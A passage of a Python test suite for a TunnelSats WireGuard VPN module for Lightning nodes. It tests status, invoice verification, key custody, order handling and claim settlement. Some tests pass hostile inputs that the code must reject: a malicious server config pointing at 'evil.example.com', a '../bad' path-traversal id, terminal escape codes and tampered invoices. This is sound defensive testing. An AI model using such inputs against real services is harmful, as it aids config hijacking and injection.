        self.fake.units["lnd.service"]["InvocationID"] = "a" * 32
        self.assertFalse(self.run_verb("tick")["restart_needed"])
        self.fake.units["lnd.service"]["InvocationID"] = INVOCATION
        self.record(decision="tor-only", reason="not_eligible:nat")
        self.assertFalse(self.run_verb("tick")["restart_needed"])
        self.record(decision="hybrid", reason="ok")
        self.assertFalse(self.run_verb("tick")["restart_needed"])
        self.assertEqual([], [c for c in self.fake.calls if c[:2] == [mod.ITS, "guard"]])
        self.record(decision="tor-only", reason="verify_timeout")
        self.fake.its["guard"] = (0, {"decision": "tor-only", "reason": "emergency_block"})
        self.assertFalse(self.run_verb("tick")["restart_needed"])
        self.fake.conf_set("tunnelsats", "off")
        calls = len(self.fake.calls)
        self.assertFalse(self.run_verb("tick")["restart_needed"])
        self.assertEqual(calls, len(self.fake.calls))

    def test_cln_restart_needed_only_with_a_confirmed_address(self):
        shutil.rmtree(self.path(mod.STATE_DIR))
        self.store(impl="cl")
        self.activate_conf("cl")
        self.fake.units["lightningd.service"].update({"ActiveState": "active", "InvocationID": INVOCATION})
        self.record(decision="hybrid", reason="announce_unconfirmed", base="lightningd")
        self.fake.its["guard"] = (0, {"decision": "hybrid", "reason": "announce_unconfirmed"})
        self.assertFalse(self.run_verb("tick")["restart_needed"])
        self.fake.its["guard"] = (0, {"decision": "hybrid", "reason": "ok"})
        self.assertTrue(self.run_verb("tick")["restart_needed"])

    @unittest.skipUnless(shutil.which("jq") and shutil.which("bash"), "needs bash and jq")
    def test_the_decision_comes_from_the_real_bash_guard(self):
        self.fake.real_guard = True
        doc = self.run_verb("tick")
        self.assertTrue(doc["restart_needed"])
        self.assertFalse(os.path.exists(self.path("run/tunnelsats/hybrid-lnd.env")))
        self.fake.conf_set("runBehindTor", "off")
        self.fake.conf_set("tunnelsats", "on")
        self.assertFalse(self.run_verb("tick")["restart_needed"])


# ------------------------------------------------------------------------------------------
# status, subscriptions-list, CLI, custody
# ------------------------------------------------------------------------------------------

class TestStatus(ModuleTestCase):
    def test_cached_refresh_and_port_change(self):
        self.store()
        self.activate_conf()
        doc = self.run_verb("status", "--cached")
        self.assertEqual(("skipped", []), (doc["sync"]["outcome"], self.fake.http_calls))
        self.assertEqual((24556, "de2.tunnelsats.com", "enabled", 0), (doc["vpn_port"], doc["server_domain"],
                                                                      doc["peer_status"], doc["resets_this_month"]))
        self.assertEqual(30, doc["tunnel"]["handshake_age_s"])
        self.assertIsNone(doc["notify_state"])
        self.fake.http_responses = [(200, {}, fixture("api", "status_port_changed.json").encode())]
        doc = self.run_verb("status", "--refresh")
        self.assertEqual("confirmed", doc["sync"]["outcome"])
        self.assertEqual("server port changed: REPAIR (restarts Lightning)", doc["action"])
        self.fake.http_responses = [OSError("down")]
        doc = self.run_verb("status", "--refresh")
        self.assertEqual(("failed", 0), (doc["sync"]["outcome"], doc["exit_code"]))
        self.assertEqual(24600, self.read_json(mod.STATE_FILE)["api"]["data"]["vpn_port"])

    def test_stale_cache_refreshes_and_invalid_answers_exit_12(self):
        self.store()
        state = self.read_json(mod.STATE_FILE)
        state["api"]["checked_at"] = "2026-10-14T05:00:00Z"
        mod.save_state(self.deps, state)
        self.fake.http_responses = [(200, {}, b'{"expiry": "never"}')]
        doc = self.run_verb("status")
        self.assertEqual(("invalid", 12), (doc["sync"]["outcome"], doc["exit_code"]))

    def test_not_configured(self):
        self.assertEqual(3, self.run_verb("status")["exit_code"])


class TestSubscriptionsList(ModuleTestCase):
    def test_local_state_only(self):
        self.assertEqual([], self.run_verb("subscriptions-list")["subscriptions"])
        self.store()
        self.activate_conf()
        item = self.run_verb("subscriptions-list")["subscriptions"][0]
        self.assertEqual({"type": "tunnelsats-v1", "id": hashlib.sha256(ALICE_PUB.encode()).hexdigest()[:8],
                          "name": "de2.tunnelsats.com", "active": True, "warning": "",
                          "description": "WireGuard VPN for Lightning clearnet via de2.tunnelsats.com, expires 2026-12-01",
                          "time_created": "2026-10-14T12:00:00Z"}, item)
        self.assertEqual([], self.fake.http_calls)


class TestCli(ModuleTestCase):
    def test_not_root_usage_and_internal_errors_give_one_document(self):
        self.deps.is_root = lambda: False
        self.assertEqual("E_NOT_ROOT", self.run_verb("status")["errors"][0]["code"])
        self.deps.is_root = lambda: True
        self.assertEqual((2, "E_USAGE"), tuple([(d["exit_code"], d["errors"][0]["code"])
                                                for d in [self.run_verb("import")]][0]))
        self.assertEqual("E_USAGE", self.run_verb("frobnicate")["errors"][0]["code"])

        def explode(argv, timeout=60, interactive=False):
            raise RuntimeError("secret detail " + ALICE_PUB)

        self.store()
        self.activate_conf()
        self.deps.run = explode
        doc = self.run_verb("check")
        self.assertEqual(("E_INTERNAL", "unexpected RuntimeError"), (doc["errors"][0]["code"], doc["errors"][0]["message"]))
        self.assertFalse(any("secret detail" in line for line in self.logs))


class TestCustody(ModuleTestCase):
    def test_private_files_use_o_excl_and_0600(self):
        seen = []
        real_open = os.open

        def recording_open(path, flags, mode=0o777, *args, **kwargs):
            if os.path.basename(str(path)).startswith("."):
                seen.append((path, flags, mode))
            return real_open(path, flags, mode, *args, **kwargs)

        with mock.patch.object(mod.os, "open", recording_open):
            self.run_verb("import", "--file", self.import_file)
        temps = [s for s in seen if mod.STATE_DIR.lstrip("/") in str(s[0])]
        self.assertTrue(temps)
        for _path, flags, mode in temps:
            self.assertTrue(flags & os.O_EXCL and flags & os.O_CREAT)
            self.assertEqual(0o600, mode)

    def test_the_private_key_never_leaves_the_config_file(self):
        self.fake.conf_set("notify", "on")
        self.run_verb("import", "--file", self.import_file)
        for verb in (["status", "--refresh"], ["check"], ["subscriptions-list"], ["detect"], ["tick"],
                     ["repair", "--yes"]):
            self.run_verb(*verb)
        for directory, _dirs, files in os.walk(self.root):
            for name in files:
                path = os.path.join(directory, name)
                if path == self.path(mod.CONF_FILE) or "/proc/" in path:
                    continue
                with open(path, "rb") as handle:
                    self.assertNotIn(ALICE_PRIV.encode(), handle.read(), path)
        self.assertTrue(all(ALICE_PRIV not in json.dumps(d) for d in self.docs))


# ------------------------------------------------------------------------------------------
# BOLT11, WireGuard keygen, pending store, and servers (P3 Commit 1)
# ------------------------------------------------------------------------------------------

class TestBolt11AndKeygen(ModuleTestCase):
    def test_decode_bolt11_and_verify_invoice(self):
        ph = "a" * 64
        inv_25k = make_bolt11("lnbc250u", payment_hash=ph, expiry=900)
        self.assertEqual(25000, mod.bolt11_amount_sats(inv_25k))
        decoded = mod.verify_bolt11_invoice(inv_25k, ph, expected_sats=25000)
        self.assertEqual((25000, ph, 900), (decoded["amount_sats"], decoded["payment_hash"], decoded["expiry_seconds"]))
        self.assertEqual(25000, mod.verify_bolt11_invoice(inv_25k, ph, expected_sats=None)["amount_sats"])
        # m = milli-BTC (0.001 BTC = 100,000 sats), n = nano-BTC (0.1 sat), p = pico-BTC (0.0001 sat)
        self.assertEqual(100000, mod.bolt11_amount_sats(make_bolt11("lnbc1m")))
        self.assertEqual(500, mod.bolt11_amount_sats(make_bolt11("lnbc5000n")))
        self.assertEqual(2, mod.bolt11_amount_sats(make_bolt11("lnbc20000p")))
        self.assertEqual(100000000, mod.bolt11_amount_sats(make_bolt11("lnbc1")))

    def test_verify_bolt11_rejects_bad_invoices(self):
        ph = "a" * 64
        inv_25k = make_bolt11("lnbc250u", payment_hash=ph)
        # Tampered checksum
        bad_csum = inv_25k[:-1] + ("q" if inv_25k[-1] != "q" else "p")
        with self.assertRaises(mod.ModuleError) as ctx:
            mod.verify_bolt11_invoice(bad_csum, ph, expected_sats=25000)
        self.assertEqual("E_INVOICE_MISMATCH", ctx.exception.code)
        # Mixed case rejected by Bech32
        with self.assertRaises(mod.ModuleError) as ctx:
            mod.verify_bolt11_invoice("LNBC" + inv_25k[4:], ph, expected_sats=25000)
        self.assertEqual("E_INVOICE_MISMATCH", ctx.exception.code)
        # Non-mainnet prefix rejected
        with self.assertRaises(mod.ModuleError) as ctx:
            mod.verify_bolt11_invoice(make_bolt11("lntb250u", payment_hash=ph), ph, expected_sats=25000)
        self.assertEqual("E_INVOICE_MISMATCH", ctx.exception.code)
        # Zero-amount invoice rejected
        with self.assertRaises(mod.ModuleError) as ctx:
            mod.verify_bolt11_invoice(make_bolt11("lnbc", payment_hash=ph), ph, expected_sats=25000)
        self.assertEqual("E_INVOICE_MISMATCH", ctx.exception.code)
        # Fractional satoshis rejected
        with self.assertRaises(mod.ModuleError) as ctx:
            mod.verify_bolt11_invoice(make_bolt11("lnbc15n", payment_hash=ph), ph, expected_sats=1)
        self.assertEqual("E_INVOICE_MISMATCH", ctx.exception.code)
        # Missing p tag rejected
        with self.assertRaises(mod.ModuleError) as ctx:
            mod.verify_bolt11_invoice(make_bolt11("lnbc250u", payment_hash=None), ph, expected_sats=25000)
        self.assertEqual("E_INVOICE_MISMATCH", ctx.exception.code)
        # Mismatch between BOLT11 p tag and expected_payment_hash
        with self.assertRaises(mod.ModuleError) as ctx:
            mod.verify_bolt11_invoice(inv_25k, "b" * 64, expected_sats=25000)
        self.assertEqual("E_INVOICE_MISMATCH", ctx.exception.code)
        # Mismatch between BOLT11 amount and expected_sats
        with self.assertRaises(mod.ModuleError) as ctx:
            mod.verify_bolt11_invoice(inv_25k, ph, expected_sats=30000)
        self.assertEqual("E_INVOICE_MISMATCH", ctx.exception.code)
        # Exceeds MAX_RENEW_SATS ceiling when expected_sats is omitted
        with self.assertRaises(mod.ModuleError) as ctx:
            mod.verify_bolt11_invoice(make_bolt11("lnbc3m", payment_hash=ph), ph, expected_sats=None)
        self.assertEqual("E_INVOICE_MISMATCH", ctx.exception.code)

    def test_generate_wg_keypair(self):
        priv, pub = mod.generate_wg_keypair()
        self.assertTrue(mod.KEY_RE.fullmatch(priv) and mod.KEY_RE.fullmatch(pub))
        self.assertEqual(pub, mod.public_key_of(priv))
        raw = base64.b64decode(priv)
        self.assertEqual(0, raw[0] & 7)
        self.assertEqual(64, raw[31] & 192)


class TestPendingStore(ModuleTestCase):
    def test_save_load_redact_and_prune_pending(self):
        pending = mod.load_pending(self.deps)
        self.assertEqual(mod.empty_pending(), pending)
        pending["order"] = {
            "order_id": "ord-1",
            "payment_hash": "a" * 64,
            "invoice": make_bolt11("lnbc250u"),
            "amount_sats": 25000,
            "server_id": "de2",
            "months": 3,
            "private_key": ALICE_PRIV,
            "public_key": ALICE_PUB,
            "created_at": "2026-10-14T10:00:00Z",
            "invoice_expires_at": "2026-10-14T10:15:00Z",
            "retained_until": "2026-10-15T10:00:00Z",
            "state": "awaiting_payment",
            "node_payment": {"state": "none", "result": None},
        }
        mod.save_pending(self.deps, pending)
        st = os.stat(self.path(mod.PENDING_FILE))
        self.assertEqual(0o600, st.st_mode & 0o777)

        # At NOW (12:00Z), invoice_expires_at (10:15Z) has passed, so state transitions to expired_unpaid
        mod.prune_pending(self.deps, pending, now=NOW)
        self.assertEqual("expired_unpaid", pending["order"]["state"])
        redacted = mod.redact_pending_item(pending["order"])
        self.assertNotIn("private_key", redacted)
        self.assertNotIn("invoice", redacted)
        self.assertTrue(redacted["has_private_key"])
        self.assertEqual(ALICE_PUB, redacted["public_key"])

        # Past retained_until (2026-10-16), unpaid expired order is pruned and drops private key
        later = datetime.datetime(2026, 10, 16, 0, 0, 0, tzinfo=datetime.timezone.utc)
        mod.prune_pending(self.deps, pending, now=later)
        self.assertIsNone(pending["order"])
        with open(self.path(mod.PENDING_FILE), "rb") as handle:
            self.assertNotIn(ALICE_PRIV.encode(), handle.read())

    def test_protected_orders_are_never_pruned(self):
        for state, np_state in (("paid", "none"), ("claiming", "none"), ("needs_support", "none"),
                                ("awaiting_payment", "paying"), ("awaiting_payment", "uncertain"),
                                ("awaiting_payment", "succeeded")):
            pending = mod.empty_pending()
            pending["order"] = {
                "order_id": "ord-prot",
                "payment_hash": "b" * 64,
                "private_key": ALICE_PRIV,
                "public_key": ALICE_PUB,
                "invoice_expires_at": "2026-10-14T10:15:00Z",
                "retained_until": "2026-10-14T11:00:00Z",
                "state": state,
                "node_payment": {"state": np_state, "result": None},
            }
            later = datetime.datetime(2026, 10, 20, 0, 0, 0, tzinfo=datetime.timezone.utc)
            mod.prune_pending(self.deps, pending, now=later, persist=False)
            self.assertIsNotNone(pending["order"], (state, np_state))


class TestServers(ModuleTestCase):
    def test_live_servers_cache_and_offline_fallback(self):
        live_raw = fixture("api", "servers.json", mode="rb")
        expected_servers = fixture_json("api", "servers.json")["servers"]
        self.assertEqual(expected_servers, list(mod.OFFLINE_SERVERS))
        self.fake.http_responses = [(200, {}, live_raw)]
        doc = self.run_verb("servers")
        self.assertEqual((0, False, False, 7), (doc["exit_code"], doc["stale"], doc["offline_list"], len(doc["servers"])))
        self.assertEqual(expected_servers, doc["servers"])
        self.assertEqual([(mod.API_SERVERS_URL, None)], self.fake.http_calls)

        # Within 60s cache window: returns fresh cache without HTTP call
        self.fake.http_calls.clear()
        doc2 = self.run_verb("servers")
        self.assertEqual(([], False, False, 7), (self.fake.http_calls, doc2["stale"], doc2["offline_list"], len(doc2["servers"])))

        # Advance clock past 60s and make API fail: falls back to stale cache (offline_list=False)
        self.deps.clock = lambda: NOW + datetime.timedelta(seconds=120)
        self.fake.http_responses = [OSError("network down")]
        doc3 = self.run_verb("servers")
        self.assertEqual((True, False, 7), (doc3["stale"], doc3["offline_list"], len(doc3["servers"])))

        # Remove cache file and make API return invalid server ID: falls back to static offline list
        os.unlink(self.path(mod.SERVERS_CACHE_FILE))
        self.fake.http_responses = [(200, {}, json.dumps([{"id": "BAD_ID!", "status": "online"}]).encode())]
        doc4 = self.run_verb("servers")
        self.assertEqual((True, True, len(mod.OFFLINE_SERVERS)),
                         (doc4["stale"], doc4["offline_list"], len(doc4["servers"])))
        self.assertEqual(expected_servers, doc4["servers"])

    def test_servers_validation_and_menu_server_choices(self):
        # Optional Server schema fields (domain, upptimeId, hasDualKeySupport) are stripped to allow-listed keys
        with_optional = {
            "servers": [
                {"id": "eu-de", "country": "Germany", "city": "Nuremberg", "flag": "🇩🇪", "status": "online",
                 "domain": "de2.tunnelsats.com", "upptimeId": "de2", "hasDualKeySupport": True},
                {"id": "us-west", "country": "USA", "city": "Hillsboro", "flag": "🇺🇸", "status": "degraded"},
                {"id": "eu-ch", "country": "Switzerland", "city": "Geneva", "flag": "🇨🇭", "status": "offline"},
            ]
        }
        parsed = mod._validate_servers_payload(json.dumps(with_optional).encode())
        self.assertIsNotNone(parsed)
        self.assertEqual(["eu-de", "us-west", "eu-ch"], [s["id"] for s in parsed])
        self.assertEqual({"id", "country", "city", "flag", "status"}, set(parsed[0].keys()))

        # Menu choices include online and degraded (marked [degraded]) and exclude offline
        choices = mod.menu_server_choices(parsed)
        self.assertEqual([
            ("eu-de", "🇩🇪 Germany - Nuremberg"),
            ("us-west", "🇺🇸 USA - Hillsboro [degraded]"),
        ], choices)

        # Duplicate server IDs, control characters, and unknown statuses are rejected
        for bad in (
            [{"id": "eu-de", "country": "Germany", "city": "Nuremberg", "status": "online"},
             {"id": "eu-de", "country": "Germany", "city": "Nuremberg", "status": "online"}],
            [{"id": "eu-de", "country": "Germany\n", "city": "Nuremberg", "status": "online"}],
            [{"id": "eu-de", "country": "Germany", "city": "Nuremberg\x00", "status": "online"}],
            [{"id": "eu-de", "country": "Germany", "city": "Nuremberg", "flag": "\x1b[31m", "status": "online"}],
            [{"id": "eu-de", "country": "Germany", "city": "Nuremberg", "status": "unknown_state"}],
        ):
            self.assertIsNone(mod._validate_servers_payload(json.dumps({"servers": bad}).encode()))

        # Corrupted cache file is ignored and refetched from API
        os.makedirs(self.path(mod.LOCK_DIR), mode=0o700, exist_ok=True)
        with open(self.path(mod.SERVERS_CACHE_FILE), "w", encoding="utf-8") as handle:
            json.dump({"fetched_at": mod.now_iso(self.deps),
                       "servers": [{"id": "../bad", "country": "X", "city": "Y", "status": "online"}]}, handle)
        self.fake.http_responses = [(200, {}, fixture("api", "servers.json", mode="rb"))]
        doc = self.run_verb("servers")
        self.assertEqual((False, False, 7), (doc["stale"], doc["offline_list"], len(doc["servers"])))


# ------------------------------------------------------------------------------------------
# buy, renew, invoice, pending, claim trust boundary, and settle (P3 Commit 2)
# ------------------------------------------------------------------------------------------

class TestBuyAndRenew(ModuleTestCase):
    def test_buy_creates_reuses_and_supersedes_orders(self):
        ph1 = "1" * 64
        inv1 = make_bolt11("lnbc250u", payment_hash=ph1, expiry=3600)
        self.fake.http_responses = [(200, {}, json.dumps({
            "orderId": "ord-101", "paymentHash": ph1, "invoice": inv1, "amountSats": 25000,
        }).encode())]
        doc1 = self.run_verb("buy", "--server", "eu-de", "--months", "1", "--pay", "none")
        self.assertEqual((0, "awaiting_payment", False, 25000, ph1),
                         (doc1["exit_code"], doc1["state"], doc1["reused"], doc1["amount_sats"], doc1["payment_hash"]))
        self.assertEqual({"match": True, "invoice_sats": 25000, "api_sats": 25000}, doc1["amount_check"])
        self.assertIn([mod.ITS, "tick-timer", "on"], self.fake.calls)

        # Same server + months while unexpired: reuses order without new HTTP call
        self.fake.http_calls.clear()
        doc_reuse = self.run_verb("buy", "--server", "eu-de", "--months", "1", "--pay", "none")
        self.assertEqual((0, True, ph1, []),
                         (doc_reuse["exit_code"], doc_reuse["reused"], doc_reuse["payment_hash"], self.fake.http_calls))

        # Different months: polls old order first (pending), moves it to retained_orders as superseded
        ph2 = "2" * 64
        inv2 = make_bolt11("lnbc600u", payment_hash=ph2, expiry=3600)
        self.fake.http_responses = [
            (200, {}, json.dumps({"status": "pending"}).encode()),
            (200, {}, json.dumps({"orderId": "ord-102", "paymentHash": ph2, "invoice": inv2, "amountSats": 60000}).encode()),
        ]
        doc2 = self.run_verb("buy", "--server", "eu-de", "--months", "3", "--pay", "none")
        self.assertEqual((0, False, ph2), (doc2["exit_code"], doc2["reused"], doc2["payment_hash"]))
        pending = mod.load_pending(self.deps)
        self.assertEqual(1, len(pending["retained_orders"]))
        self.assertEqual(("ord-101", "superseded"), (pending["retained_orders"][0]["order_id"], pending["retained_orders"][0]["state"]))

        # If poll during supersede shows old order was paid, refuses with E_ORDER_PENDING and marks it paid
        self.fake.http_responses = [(200, {}, json.dumps({"status": "paid"}).encode())]
        doc_paid = self.run_verb("buy", "--server", "us-east", "--months", "6", "--pay", "none")
        self.assertEqual((14, "E_ORDER_PENDING"), (doc_paid["exit_code"], doc_paid["error"]))
        self.assertEqual("paid", mod.load_pending(self.deps)["order"]["state"])

    def test_buy_refusals(self):
        # --pay node without --yes requires confirmation
        doc = self.run_verb("buy", "--server", "eu-de", "--months", "1", "--pay", "node")
        self.assertEqual((2, "E_CONFIRMATION_REQUIRED"), (doc["exit_code"], doc["error"]))
        # Invalid server ID
        doc = self.run_verb("buy", "--server", "BAD_SERVER!", "--months", "1", "--pay", "none")
        self.assertEqual((2, "E_USAGE"), (doc["exit_code"], doc["error"]))
        # Invoice amount mismatch
        ph = "3" * 64
        inv = make_bolt11("lnbc250u", payment_hash=ph)
        self.fake.http_responses = [(200, {}, json.dumps({
            "orderId": "ord-bad", "paymentHash": ph, "invoice": inv, "amountSats": 99999,
        }).encode())]
        doc = self.run_verb("buy", "--server", "eu-de", "--months", "1", "--pay", "none")
        self.assertEqual((12, "E_INVOICE_MISMATCH"), (doc["exit_code"], doc["error"]))
        self.assertIsNone(mod.load_pending(self.deps)["order"])
        # Already configured
        self.store()
        doc = self.run_verb("buy", "--server", "eu-de", "--months", "1", "--pay", "none")
        self.assertEqual((14, "E_ALREADY_CONFIGURED"), (doc["exit_code"], doc["error"]))

    def test_renew_creates_and_reuses_renewal(self):
        # Unconfigured node refuses renew
        self.assertEqual((3, "E_NOT_CONFIGURED"),
                         tuple([(d["exit_code"], d["error"]) for d in [self.run_verb("renew", "--months", "1", "--pay", "none")]][0]))
        self.store()
        ph = "4" * 64
        inv = make_bolt11("lnbc250u", payment_hash=ph, expiry=3600)
        # Renew allows omitted amountSats as long as BOLT11 is <= MAX_RENEW_SATS
        self.fake.http_responses = [(200, {}, json.dumps({
            "renewalId": "ren-1", "paymentHash": ph, "invoice": inv,
        }).encode())]
        doc = self.run_verb("renew", "--months", "1", "--pay", "none")
        self.assertEqual((0, "awaiting_payment", False, "de2", 25000, "2026-12-01T00:00:00.000Z"),
                         (doc["exit_code"], doc["state"], doc["reused"], doc["server_id"], doc["amount_sats"], doc["old_expiry"]))
        self.assertEqual("2026-12-31T00:00:00Z", doc["new_expiry"])
        self.assertEqual({"serverId": "de2", "duration": 1, "wgPublicKey": ALICE_PUB}, self.fake.http_calls[-1][1])

        # Reuses unexpired renewal for same months
        self.fake.http_calls.clear()
        doc2 = self.run_verb("renew", "--months", "1", "--pay", "none")
        self.assertEqual((0, True, []), (doc2["exit_code"], doc2["reused"], self.fake.http_calls))

    def test_buy_refuses_to_supersede_a_processing_order(self):
        # HTTP 202 on the order poll: paid, the API still provisions it; never replaced by a new order
        ph = "1" * 64
        self.fake.http_responses = [(200, {}, json.dumps({
            "orderId": "ord-101", "paymentHash": ph, "invoice": make_bolt11("lnbc250u", payment_hash=ph, expiry=3600),
            "amountSats": 25000}).encode())]
        self.assertEqual(0, self.run_verb("buy", "--server", "eu-de", "--months", "1", "--pay", "none")["exit_code"])
        self.fake.http_responses = [(202, {}, fixture("api", "order_processing.json").encode())]
        doc = self.run_verb("buy", "--server", "eu-de", "--months", "3", "--pay", "none")
        self.assertEqual((14, "E_ORDER_PENDING"), (doc["exit_code"], doc["error"]))
        pending = mod.load_pending(self.deps)
        self.assertEqual(("paid", ph, []), (pending["order"]["state"], pending["order"]["payment_hash"],
                                            pending["retained_orders"]))

    def test_renew_refuses_to_replace_a_processing_renewal(self):
        self.store()
        ph = "4" * 64
        self.fake.http_responses = [(200, {}, json.dumps({
            "renewalId": "ren-1", "paymentHash": ph, "invoice": make_bolt11("lnbc250u", payment_hash=ph, expiry=3600),
        }).encode())]
        self.assertEqual(0, self.run_verb("renew", "--months", "1", "--pay", "none")["exit_code"])
        self.fake.http_responses = [(202, {}, fixture("api", "order_processing.json").encode())]
        doc = self.run_verb("renew", "--months", "3", "--pay", "none")
        self.assertEqual((14, "E_RENEWAL_PENDING"), (doc["exit_code"], doc["error"]))
        self.assertEqual(("paid", ph), (mod.load_pending(self.deps)["renewal"]["state"],
                                        mod.load_pending(self.deps)["renewal"]["payment_hash"]))


class TestInvoiceAndPending(ModuleTestCase):
    def test_invoice_qr_png_expiry_and_pending_redaction(self):
        self.assertEqual("E_NO_PENDING", self.run_verb("invoice", "--kind", "order")["error"])
        ph = "5" * 64
        inv = make_bolt11("lnbc250u", payment_hash=ph, expiry=900)
        self.fake.http_responses = [(200, {}, json.dumps({
            "orderId": "ord-5", "paymentHash": ph, "invoice": inv, "amountSats": 25000,
        }).encode())]
        self.run_verb("buy", "--server", "eu-de", "--months", "1", "--pay", "none")
        qr_path = os.path.join(self.root, "invoice.png")
        doc_inv = self.run_verb("invoice", "--kind", "order", "--qr-png", qr_path)
        self.assertEqual((0, inv, qr_path), (doc_inv["exit_code"], doc_inv["invoice"], doc_inv["qr_png"]))
        self.assertTrue(os.path.isfile(qr_path))
        self.assertIn(["qrencode", "-o", qr_path, "-s", "6", "-m", "2", inv.upper()], self.fake.calls)

        # Pending redacts private_key and invoice
        doc_pend = self.run_verb("pending")
        self.assertEqual("awaiting_payment", doc_pend["order"]["state"])
        self.assertNotIn("private_key", doc_pend["order"])
        self.assertNotIn("invoice", doc_pend["order"])
        self.assertTrue(doc_pend["order"]["has_private_key"])

        # Advance clock past 900s invoice expiry: pending marks expired_unpaid, invoice refuses with E_INVOICE_EXPIRED
        self.deps.clock = lambda: NOW + datetime.timedelta(seconds=1200)
        doc_pend2 = self.run_verb("pending")
        self.assertEqual("expired_unpaid", doc_pend2["order"]["state"])
        doc_exp = self.run_verb("invoice", "--kind", "order")
        self.assertEqual((14, "E_INVOICE_EXPIRED"), (doc_exp["exit_code"], doc_exp["error"]))


class TestClaimAndSettle(ModuleTestCase):
    def valid_claim_doc(self, pub=ALICE_PUB):
        """The 200 claim body of the API (fixtures/api/claim_client_held.json), plus a hostile fullConfig
        that the trust boundary must never read."""
        doc = fixture_json("api", "claim_client_held.json")
        doc["peer"]["publicKey"] = pub
        doc["fullConfig"] = "[Interface]\nPrivateKey = EVIL_SERVER_KEY\n"
        return doc

    def test_assemble_claimed_config_trust_boundary(self):
        cfg = mod.assemble_claimed_config(self.valid_claim_doc(), ALICE_PRIV, ALICE_PUB)
        self.assertEqual((ALICE_PRIV, ALICE_PUB, "de2.tunnelsats.com", 24556, "2026-12-01T00:00:00Z"),
                         (cfg["private_key"], cfg["public_key"], cfg["endpoint_host"], cfg["vpn_port"], cfg["valid_until"]))
        # The API's allowedIPs (with ::/0) and its bare peer.address end up in the canonical config
        self.assertEqual((["0.0.0.0/0", "::/0"], ["10.9.0.42/32"]), (cfg["allowed_ips"], cfg["addresses"]))
        ipv4_only = dict(self.valid_claim_doc(), server=dict(self.valid_claim_doc()["server"], allowedIPs="0.0.0.0/0"))
        self.assertEqual(["0.0.0.0/0"], mod.assemble_claimed_config(ipv4_only, ALICE_PRIV, ALICE_PUB)["allowed_ips"])

        # Rejects mismatched peer.publicKey, bad or missing address (including the undocumented name 'ip'),
        # non-tunnelsats host, allowedIPs without 0.0.0.0/0 or with an invalid entry, bad port, bad date
        peer, server = self.valid_claim_doc()["peer"], self.valid_claim_doc()["server"]
        no_address = {k: v for k, v in peer.items() if k != "address"}
        bad_cases = [
            {"peer": dict(peer, publicKey=BOB_PUB)},
            {"peer": dict(peer, address="192.168.1.1")},
            {"peer": dict(peer, address="10.9.0.0/24")},
            {"peer": no_address},
            {"peer": dict(no_address, ip="10.9.0.42/32")},
            {"vpnPort": 70000},
            {"vpnPort": None, "peer": dict(peer, vpnPort=24556)},
            {"server": dict(server, endpoint="evil.example.com:51820")},
            {"server": dict(server, allowedIPs="10.0.0.0/8")},
            {"server": dict(server, allowedIPs="::/0")},
            {"server": dict(server, allowedIPs="0.0.0.0/0, ::/0, not-a-network")},
            {"subscriptionEnd": "not-a-date"},
        ]
        for patch in bad_cases:
            doc = dict(self.valid_claim_doc(), **patch)
            with self.assertRaises(mod.ModuleError) as ctx:
                mod.assemble_claimed_config(doc, ALICE_PRIV, ALICE_PUB)
            self.assertEqual("E_CLAIM_INVALID", ctx.exception.code, patch)

    def test_settle_order_polls_claims_and_activates(self):
        self.record()
        ph = "6" * 64
        order = {
            "order_id": "ord-6",
            "payment_hash": ph,
            "invoice": make_bolt11("lnbc250u", payment_hash=ph),
            "amount_sats": 25000,
            "server_id": "de2",
            "months": 1,
            "impl": "lnd",
            "private_key": ALICE_PRIV,
            "public_key": ALICE_PUB,
            "created_at": "2026-10-14T12:00:00Z",
            "invoice_expires_at": "2026-10-14T13:00:00Z",
            "retained_until": "2026-10-15T12:00:00Z",
            "state": "awaiting_payment",
            "node_payment": {"state": "none", "result": None},
        }
        pending = mod.empty_pending()
        pending["order"] = order
        mod.save_pending(self.deps, pending)

        # First poll: pending; second poll (after 5s sleep): paid; then claim (200); then api_status (200)
        self.fake.http_responses = [
            (200, {}, json.dumps({"status": "pending"}).encode()),
            (200, {}, json.dumps({"status": "paid"}).encode()),
            (200, {}, json.dumps(self.valid_claim_doc()).encode()),
            (200, {}, fixture("api", "status_enabled.json").encode()),
        ]
        doc = self.run_verb("settle", "--wait", "10")
        self.assertEqual((0, "active", "protected", [5]),
                         (doc["exit_code"], doc["state"], doc["verdict"], self.fake.sleeps))
        self.assertIsNone(mod.load_pending(self.deps)["order"])
        with open(self.path(mod.PENDING_FILE), "rb") as handle:
            self.assertNotIn(ALICE_PRIV.encode(), handle.read())
        self.assertEqual(ALICE_PUB, mod.load_state(self.deps)["public_key"])

    def test_settle_claim_409_marks_needs_support(self):
        ph = "7" * 64
        pending = mod.empty_pending()
        pending["order"] = {
            "order_id": "ord-7", "payment_hash": ph, "private_key": ALICE_PRIV, "public_key": ALICE_PUB,
            "created_at": "2026-10-14T12:00:00Z", "invoice_expires_at": "2026-10-14T13:00:00Z",
            "retained_until": "2026-10-15T12:00:00Z", "state": "paid",
            "node_payment": {"state": "none", "result": None},
        }
        mod.save_pending(self.deps, pending)
        self.fake.http_responses = [(409, {}, b'{"error": "ERR_ALREADY_CLAIMED"}')]
        doc = self.run_verb("settle")
        self.assertEqual((12, "E_CLAIM_CONFLICT"), (doc["exit_code"], doc["error"]))
        saved = mod.load_pending(self.deps)["order"]
        self.assertEqual("needs_support", saved["state"])

    def order_record(self, ph, state):
        return {
            "order_id": "ord-%s" % ph[:4], "payment_hash": ph, "invoice": make_bolt11("lnbc250u", payment_hash=ph),
            "amount_sats": 25000, "server_id": "de2", "months": 1, "impl": "lnd",
            "private_key": ALICE_PRIV, "public_key": ALICE_PUB,
            "created_at": "2026-10-14T12:00:00Z", "invoice_expires_at": "2026-10-14T13:00:00Z",
            "retained_until": "2026-10-15T12:00:00Z", "state": state,
            "node_payment": {"state": "none", "result": None},
        }

    def test_settle_claim_202_keeps_claiming_then_activates(self):
        # Right after a node payment the claim can race the API's own provisioning (HTTP 202,
        # "retry the claim"): the order stays in claiming and the next settle pass activates it
        self.record()
        ph = "8" * 64
        pending = mod.empty_pending()
        pending["order"] = self.order_record(ph, "paid")
        mod.save_pending(self.deps, pending)
        self.fake.http_responses = [(202, {}, fixture("api", "claim_processing.json").encode())]
        doc = self.run_verb("settle")
        self.assertEqual((11, "claiming", True), (doc["exit_code"], doc["state"], doc["retryable"]))
        saved = mod.load_pending(self.deps)["order"]
        self.assertEqual(("claiming", None, ALICE_PRIV), (saved["state"], saved.get("error_code"), saved["private_key"]))
        self.assertIsNone(mod.load_state(self.deps))

        self.fake.http_responses = [
            (200, {}, json.dumps(self.valid_claim_doc()).encode()),
